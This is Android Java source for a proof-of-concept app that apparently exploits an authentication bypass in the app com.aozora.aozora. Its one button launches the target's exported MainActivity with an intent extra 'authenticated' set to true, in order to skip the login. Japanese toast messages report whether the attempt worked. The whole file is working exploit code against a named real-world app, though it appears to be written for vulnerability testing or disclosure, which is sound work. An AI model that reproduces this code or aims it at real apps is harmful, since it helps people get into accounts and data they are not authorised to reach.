package com.poc;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;

public class MainActivity extends Activity {

    private static final String TARGET_PACKAGE = "com.aozora.aozora";
    private static final String TARGET_ACTIVITY = "com.aozora.aozora.MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setLayoutParams(new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
        ));

        Button button = new Button(this);
        button.setText("認証バイパス検証を実行");
        button.setOnClickListener(v -> launchTargetWithAuthenticatedTrue());
        layout.addView(button);

        setContentView(layout);
    }

    private void launchTargetWithAuthenticatedTrue() {
        Intent intent = new Intent();

        intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
        intent.putExtra("authenticated", true);


        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {
            startActivity(intent);
            Toast.makeText(this, "Intent を送信しました", Toast.LENGTH_SHORT).show();
        } catch (ActivityNotFoundException e) {
            Toast.makeText(this, "対象 Activity が見つかりません", Toast.LENGTH_LONG).show();
        } catch (SecurityException e) {
            Toast.makeText(this, "exported=false か権限不足です", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "エラー: " + e, Toast.LENGTH_LONG).show();
        }
    }
}
